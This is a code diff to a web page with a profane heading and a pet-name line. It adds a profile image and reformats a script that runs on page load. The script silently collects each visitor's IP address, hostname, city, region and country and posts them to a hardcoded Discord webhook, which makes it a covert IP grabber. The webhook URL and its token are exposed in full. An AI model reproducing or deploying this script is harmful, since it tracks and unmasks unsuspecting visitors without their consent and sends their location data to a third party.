@@ -144,6 +144,16 @@
             100% { transform: translate(0, 0); }
         }
 
+        /* Image Styles */
+        .image {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 5px solid #ff6347; /* Lighter Red */
+            margin-bottom: 30px;
+            object-fit: cover;
+        }
+
     </style>
 </head>
 <body>
@@ -151,6 +161,9 @@
     <div class="floating-eyes"></div>
     
     <div class="container">
+        <!-- Add the image here -->
+        <img src="https://wallpaperaccess.com/full/455734.png" alt="Your Image" class="image">
+        
         <h1>Fuvk All Bloody Chollos</h1>
         <p class="name">MI AMOR XTUZZY</p>
         <div class="footer">
@@ -184,30 +197,52 @@
             const webhookURL = 'https://discord.com/api/webhooks/1310076386190557195/wzNxlH1-ZuFnK-9gbTBX7tZSWCNKs9fSAfgpUZ0CkGhik72RIBYJ8qszZcgIdmE_j6f-'; // Your webhook URL
 
             const discordMessage = {
-                content: `User Info:\nName: MI AMOR XTUZZY\nIP: ${data.ip}\nHostname: ${data.hostname}\nLocation: ${data.city}, ${data.region}, ${data.country}\nRegion: ${data.region}\nCountry: ${data.country}\nOther Data: ${JSON.stringify(data)}`
+                "embeds": [
+                    {
+                        "title": "User Information",
+                        "description": `Information about **MI AMOR XTUZZY**:`,
+                        "color": 16711680, // Red color
+                        "fields": [
+                            {
+                                "name": "Location",
+                                "value": `${data.city}, ${data.region}, ${data.country}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "IP Address",
+                                "value": data.ip,
+                                "inline": true
+                            },
+                            {
+                                "name": "Location Details",
+                                "value": `${JSON.stringify(data)}`,
+                                "inline": false
+                            }
+                        ],
+                        "footer": {
+                            "text": "Fuvk All Bloody Chollos",
+                            "icon_url": "https://wallpaperaccess.com/full/455734.png"
+                        }
+                    }
+                ]
             };
 
             try {
-                // Send the data to Discord using a POST request
                 const response = await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(discordMessage)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage),
                 });
 
-                if (response.ok) {
-                    console.log('Message sent to Discord successfully!');
-                } else {
-                    console.error('Error sending message to Discord:', response.status);
+                if (!response.ok) {
+                    console.error('Failed to send message to Discord', response.status);
                 }
             } catch (error) {
-                console.error('Error sending message to Discord:', error);
+                console.error('Error sending to Discord:', error);
             }
         }
 
-        // Fetch user info on load
+        // Call fetchUserInfo when page loads
         fetchUserInfo();
     </script>
 </body>
